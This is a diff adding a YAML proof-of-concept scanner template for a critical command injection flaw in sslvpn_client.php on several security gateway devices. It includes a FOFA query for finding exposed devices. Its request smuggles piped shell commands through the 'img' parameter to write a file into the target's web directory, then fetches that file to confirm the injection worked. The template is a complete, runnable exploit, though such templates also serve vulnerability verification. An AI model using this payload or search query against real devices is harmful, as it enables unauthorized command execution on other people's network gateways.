@@ -1,0 +1,26 @@
+id: poc-yaml-multiple-security-gateway-devices-sslvpn-client-php-command-injection
+info:
+  name: 多个安全网关设备 sslvpn_client.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: 多个安全网关设备
+  fofa: body="/webui/images/default/default/alert_close.jpg"
+variables:
+  t1: random_str(3)
+requests:
+- method: GET
+  path: /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60pwd%60%20|tee%20/usr/local/webui/sslvpn/{{.t1}}.txt|ls
+  expression: 'status_code == 200
+
+    && contains(body,t1)
+
+    && contains(body,"sslvpn")
+
+    && !contains(body,"<")
+
+    '
+- method: GET
+  path: /sslvpn/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"/usr/local/webui/sslvpn")
+transport: http
